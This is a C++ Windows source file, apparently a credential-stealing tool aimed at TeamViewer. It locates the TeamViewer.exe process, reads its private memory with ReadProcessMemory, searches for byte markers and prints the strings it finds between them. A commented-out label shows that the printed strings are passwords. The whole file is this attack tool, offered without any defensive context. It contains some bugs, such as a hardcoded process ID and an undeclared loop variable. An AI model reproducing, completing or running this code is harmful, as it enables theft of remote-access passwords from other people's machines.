#include <set>
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <list>     
#include <iterator>
#include <algorithm>
#include <iomanip>
#include <stdio.h>
#include <ctype.h>
using namespace std;

list<int> optimize(int j_arr[],int j_len)
{		
	cout << "start optimize\n";
list<int> tmp_arr;

	for (int j=0;j<j_len-1;j+=2)
		{

			if(j_arr[j+1]-j_arr[j]<=3)
			{
				tmp_arr.push_back(j_arr[j+1]);
			}
			else
			{
				tmp_arr.push_back(j_arr[j+1]);
				tmp_arr.push_back(j_arr[j]);
			}
		}
		
		int len = std::distance(tmp_arr.begin(),tmp_arr.end());
		cout << "len "<< len << endl;
//		int *arr = new int[tmp_arr.size()];
//		copy(tmp_arr.begin(),tmp_arr.end(),j_arr);
//cout<< std::distance(tmp_arr.begin(),tmp_arr.end());
return tmp_arr;
}

int GetProcId(char* ProcName)
{
	PROCESSENTRY32   pe32;
	HANDLE         hSnapshot = NULL;
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( Process32First( hSnapshot, &pe32 ) )
	{
		do{
			if( strcmp( pe32.szExeFile, ProcName ) == 0 )
				break;
		}while( Process32Next( hSnapshot, &pe32 ) );
	}
	if( hSnapshot != INVALID_HANDLE_VALUE )
		CloseHandle( hSnapshot );
	return pe32.th32ProcessID;
	
}

string intToHexString(int intValue) {
    string hexStr;
    std::stringstream sstream;
    sstream << "0x"
            << std::setfill ('0') << std::setw(2)
    << std::hex << (int)intValue;

    hexStr= sstream.str();
    sstream.clear();   

    return hexStr;
}
bool PromptForChar( const char* prompt, char& readch )
{
    std::string tmp;
    std::cout << prompt << std::endl;
    if (std::getline(std::cin, tmp))
    {
        if (tmp.length() == 1)
        {
            readch = tmp[0];
        }
        else
        {
            readch = '\0';
        }
        return true;
    }
    return false;
}

bool readMemory(DWORD pid, char* _p, size_t len)
{
	HANDLE process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if(process)
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);

        MEMORY_BASIC_INFORMATION info;
        std::vector<char> chunk;
        char* p = _p;
		VirtualQueryEx(process, p, &info, sizeof(info));
		chunk.resize(len);
		SIZE_T bytesRead;
		ReadProcessMemory(process, p, &chunk[0], len, &bytesRead);
		
		if (bytesRead<6*2)
		{
			return false;
		}
		for (int i = 0;i<bytesRead;i+=2)
		{
			if (!isprint(chunk[i]) || ((int)chunk[i])<=0)
			{
					return false;
			}
		}
		
		//cout<< "length = " << bytesRead << endl;
		
		if (bytesRead>1)
		{
			//cout<<"***********"<<endl<<intToHexString((int)(void*)p)<<endl<<"Password: ";		
			for (i = 0;i<bytesRead;i+=2)
			{
					cout<< /*"char = "<< */chunk[i] ;/*<< " int = " << (int)chunk[i];*/	
			}
			cout <<endl;
			//cout<<intToHexString((int)(void*)p)<<endl<<"***********"<<endl;
		}
		
    }
	return true;
}

void foo(const std::list<int>& first, const std::list<int>& second, const int limit)
{
	cout << "foo\n";
    std::list<int>::const_iterator it1 = first.begin();
    std::list<int>::const_iterator  it2 = second.begin();

	
    while (it1 != first.end() && it2 != second.end()) {
        if (*it1 + limit < *it2) {
            ++it1;
        } else if (*it2 + limit < *it1) {
            ++it2;
        } else {

					
            //std::cout << *it2 <<" "<< *it1 << std::endl;
			{
				            //std::cout << intToHexString(*it1+2) <<" "<< intToHexString(*it2) << " " <<*it2-*it1<< std::endl;
							try{
								if (*it2-*it1>0)
									readMemory(6604,(char*)(void*)(*it1+2),*it2-*it1-2);//);
							}catch (int a){
							cout<< "cc"<<endl;
							}
			}	
            ++it1;
        }
    }
}

void GetAddressOfData(DWORD pid, const char *data, size_t len, list<int>& entries)
{
	//list<int>* entries;
	int count = 0;
    HANDLE process = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if(process)
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);

        MEMORY_BASIC_INFORMATION info;
        std::vector<char> chunk;
        char* p = 0;
        while(p < si.lpMaximumApplicationAddress)
        {
            if(VirtualQueryEx(process, p, &info, sizeof(info)) == sizeof(info))
            {
			  if (info.Type == MEM_PRIVATE && info.State == MEM_COMMIT)
			  {     
				    p = (char*)info.BaseAddress;
					chunk.resize(info.RegionSize);
					SIZE_T bytesRead;

					if(ReadProcessMemory(process, p, &chunk[0], info.RegionSize, &bytesRead))
					{

					   for(size_t i = 0; i < (bytesRead - len); ++i)
						{							
								if(memcmp(data, &chunk[i], len) == 0)
								{
									entries.push_back((int)(void*)(p+i));
									count ++;
								}
						}
					}
				}
                p += info.RegionSize;
            }

        }
    }
	
	cout << "count " <<  count << '\n';
	cout << "start return\n";
		
	return ;
}

void __main(bool flag)
{
		const char start_magic_data[] = "\x00\x88"; 
  		char _end_magic_data1[] = "\x00\x00\x00\x20\x00\x00";
		char _end_magic_data2[] = "\x00\x00\x00\x00\x00\x00";
		if (flag)
		{
			*_end_magic_data1 = *_end_magic_data1;
		}
		else
		{
			memcpy(_end_magic_data1, _end_magic_data2, sizeof(_end_magic_data2));
		}

		for (int mg=0;mg<6;mg++)
		{
			cout<< (int)_end_magic_data1[mg];
		}
		int PID = GetProcId("TeamViewer.exe");	
		std::cout << "Local data address: " << (void*)start_magic_data << "\n";
		cout<<"start end magic search "<<'\n';	
		
		
		list<int> start_address ; 
			GetAddressOfData(PID, start_magic_data, 2, start_address);	
		cout << "DDDDDDDDDD " << std::distance(start_address.begin(),start_address.end()) << endl;


		list<int> end_address  ; 
			GetAddressOfData(PID, _end_magic_data1, (sizeof(_end_magic_data1)/sizeof(*_end_magic_data1))-1,end_address );
		cout << "DDDDDDDDDD " << std::distance(end_address.begin(),end_address.end()) << endl;
		
		
		
		//start_address.reverse();
	//	end_address.reverse();


		int key = 0;
		int count = 0;
		

		/* i - index of start_address
			std::vector<double> v;
			double* i_arr = &v[0];
		*/

		//int i_len = std::distance(start_address.begin(),start_address.end()); 
		//int *i_arr = new int[i_len];
		//std::copy(start_address.begin(), start_address.end(), i_arr);
		

		//int j_len = std::distance(end_address.begin(),end_address.end()); 
		//int *j_arr = new int[j_len];;
		//std::copy(end_address.begin(), end_address.end(), j_arr);
		//optimize
		//list<int> ret_list ;
		
		//cout << j_len << endl;
		

		//ret_list = optimize(i_arr,i_len);
		//start_address.clear();
		//start_address = ret_list;
		//cout << "leeength " << std::distance(start_address.begin(),start_address.end())<<endl;

		//ret_list = optimize(j_arr,j_len);
		//end_address.clear();
		//end_address = ret_list;
		//cout << "leeength " << std::distance(end_address.begin(),end_address.end())<<endl;

		cout << "_main foo\n";

		foo(start_address,end_address,33);
		cout<< "ENDDD "<< endl;
		cin.get();
		///ret_list.clear();		
		//start_address.reverse();
		//end_address.reverse();


//		cout << intToHexString(i_arr[0]) << " " ;
/*
		for (std::list<int>::const_iterator iterator = start_address.begin(), end = start_address.end(); iterator != end; ++iterator) 
		{
			int i = *iterator;
			
			key = i;	
			for (int j=key;j<key+33;j++)
			{
				std::list<int>::iterator it = std::find(end_address.begin(), end_address.end(), j);///////////////////// need use another search alg

				if ( it != end_address.end() )
				{
						if (readMemory(PID,(char*)(void*)(i+2),j-i-2))
							{	
								break;
							}
				}
			}
						//count++;
						//cout << count << endl;
		}

	cout<<count;*/
}
int main()
{
	
	__main(true);

	char type = '\0';
	while( PromptForChar( "Try 00x00x00x00x00x00x00 magic data (it can take a lot of time, try to run the code in python or try change search function (166-173 lines (: ? [y/n]", type ) )
		{
			if (type == 'y')
			{
					__main(false);			
			}
			if (type== 'n')
			{
					cout << ":-)";
					return 0;
			}
		}
    return 0;	


}
